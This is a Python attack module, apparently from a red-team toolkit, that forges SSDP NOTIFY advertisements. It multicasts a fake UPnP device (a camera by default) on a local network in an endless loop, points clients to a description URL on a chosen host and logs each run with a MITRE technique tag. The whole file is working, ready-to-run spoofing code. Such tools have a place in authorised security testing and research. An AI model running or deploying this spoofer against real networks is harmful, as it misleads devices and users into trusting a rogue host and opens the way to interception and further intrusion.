# modules/attacks/ssdp_advertisement_faker.py

import socket
import time
import argparse
import json
import uuid
from datetime import datetime
import os

LOG_PATH = "results/ssdp_faker_logs.json"
MITRE_TTP = "T1200"

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def create_ssdp_packet(ip, usn, device_type):
    return f"""NOTIFY * HTTP/1.1
HOST: 239.255.255.250:1900
CACHE-CONTROL: max-age=1800
LOCATION: http://{ip}/description.xml
NT: {device_type}
NTS: ssdp:alive
SERVER: REDoT/1.0 UPnP/1.1 FakeDevice/1.0
USN: uuid:{usn}::{device_type}

""".replace("\n", "\r\n").encode()

def broadcast_ssdp(ip, iface, usn, device_type, interval):
    addr = ("239.255.255.250", 1900)
    pkt = create_ssdp_packet(ip, usn, device_type)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(ip))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)

    log_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "ip": ip,
        "device_type": device_type,
        "usn": usn,
        "interval": interval,
        "ttp": MITRE_TTP
    })

    while True:
        s.sendto(pkt, addr)
        time.sleep(interval)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fake SSDP Advertiser (UPnP Discovery)")
    parser.add_argument("--ip", required=True, help="Local IP to advertise device on")
    parser.add_argument("--device", default="urn:schemas-upnp-org:device:Camera:1", help="Fake device type")
    parser.add_argument("--interval", type=int, default=5, help="Broadcast interval (seconds)")
    args = parser.parse_args()

    usn = str(uuid.uuid4())
    broadcast_ssdp(args.ip, "eth0", usn, args.device, args.interval)
